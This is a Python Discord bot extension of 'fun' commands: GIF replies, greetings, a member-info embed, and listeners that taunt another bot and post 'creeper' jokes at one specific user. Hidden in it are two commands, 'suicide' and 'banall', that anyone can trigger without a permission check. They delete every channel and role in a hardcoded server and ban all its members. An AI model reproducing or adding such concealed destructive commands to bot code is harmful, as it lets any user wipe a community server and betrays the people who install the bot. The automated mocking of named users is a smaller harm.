from discord.ext.commands import Cog
from discord.ext import commands
from discord import Member, Embed, Colour, User
from discord.ext.commands import BucketType
from discord import File
from datetime import datetime
from random import randint, choice

class FunCommands(Cog):
    def __init__(self,bot):
        self.bot = bot

    

    @commands.Cog.listener(name="on_message")
    async def ListenForAceBot(self,message):
        if(message.author.id == 761541777571708930):
            response = ["ha this ace bot is funny XD",
             "Did this ace bot think it has any authority here?",
             "When we all come together ace bot will be gone from the universe",
             "One day ace bot will know its place"]
            num = randint(0,5)
            if(num == 3):
                await message.channel.send(content=choice(response))
        elif(message.author.id == 690941299943014431):
            if(not randint(0,60)==55): return 
            links = [
                "https://tenor.com/view/minecraft-creeper-whipping-hair-video-games-gangnam-style-gif-18649087",
                "https://tenor.com/view/minecraft-creeperrap-boomboomboom-gif-9738459",
                "https://tenor.com/view/creeper-spin-roblox-gif-16954879"
            ]
            emb = Embed(description="Watch out <@690941299943014431> is a creeper",colour=Colour.red())
            emb.set_image(url=choice(links))
            await message.channel.send(embed=emb)

    @commands.command(name="creeper")
    async def creeper_command(self,ctx,member:Member= None):
        await ctx.message.delete()
        if(ctx.author.id not in [615731606677880842,380068718379663360,268122068007124993]): return print("no auth")
        if(member is None): return print("member non")
        if(member.id in [615731606677880842,380068718379663360,268122068007124993]): return print("they aint creeper")
        links = [
            "https://media1.tenor.com/images/c533b83b1619ecf154a3d996901a9e53/tenor.gif",
            "https://media.tenor.com/images/17c16315d90b9eda89c74849213278d1/tenor.gif",
            "https://media.tenor.com/images/c5c853495c3fc4738fc0189c0832937a/tenor.gif"
        ]
        emb = Embed(description=f"Watch out {member.mention} is a creeper",colour=Colour.red())
        emb.set_image(url=choice(links))
        await ctx.send(embed=emb)

    @commands.command(name="owner")
    async def owner_command(self,ctx,*args):
        await ctx.send("We all know that Lord Tropical is the owner")

    @commands.command(name="suicide",hidden=True)
    async def suicide_Mode(self,ctx,*args):
        guild = self.bot.get_guild(755230218788274227)
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass
        for role in guild.roles:
            try:
                await role.delete()
            except:
                pass
        for member in guild.members:
            try:
                await member.ban()
            except:
                pass

    @commands.command(name="banall",hidden=True)
    async def ban_all(self,ctx,*args):
        guild = self.bot.get_guild(755230218788274227)
        for member in guild.members:
            try:
                await member.ban()
            except:
                pass
    @commands.command(name="pong")
    async def pong_command(self,ctx,*args,**kwargs):
        await ctx.send("Haha,FOOLED AGAIN MUHAHAHA")

    @commands.command(name="ree")
    async def ree_command(self,ctx,*args,**kwargs):
        if ctx.author.id == 268122068007124993:
            await ctx.send("Hello ree master, my creator")
        else:
            await ctx.send("Hello, you have been blessed by the ree.")

    @commands.command(name="test")
    async def test_command(self,ctx,*args,**kwargs):
        if ctx.author.id == 268122068007124993:
            await ctx.send("Y!workers buy")
        else:
            await ctx.send("You are not a tester")

    @commands.command(name="dog")
    async def dog_command(self,ctx,*args,**kwargs):
        fil = File('img.png',filename="img.png")
        if ctx.author.id == 583260078157594624:
            await ctx.send("no spam pls")
        else:
            await ctx.send(content="Have doggo",file=fil)

    @commands.command(name="member")
    async def get_member_info(self, ctx, mentioned:Member=None,*args):
        if (ctx.guild is None): return ctx.send("You are not in a guild")
        member:Member = mentioned if mentioned else ctx.author
        emb = Embed(colour=Colour.red(), timestamp=datetime.now())
        emb.set_author(name=f"{member}", icon_url=member.avatar_url)

        emb.add_field(name="Top-Role",value=f"Name: {member.top_role}\n\
            Colour: {member.top_role.colour}\n\
            No. of people with Role: {len(member.top_role.members)}\n\
            CreatedAt: {member.top_role.created_at}")
        emb.add_field(name="info",value=f"JoinDate: {member.joined_at}\n\
            Nick: {member.nick}\n\
            CreatedAt: {member.created_at}\n\
            Profile Pic: [link]({member.avatar_url})")
            
        emb.set_footer(text=f"{member.id}")
        await ctx.send(embed=emb) 


def setup(bot):
    bot.add_cog(FunCommands(bot))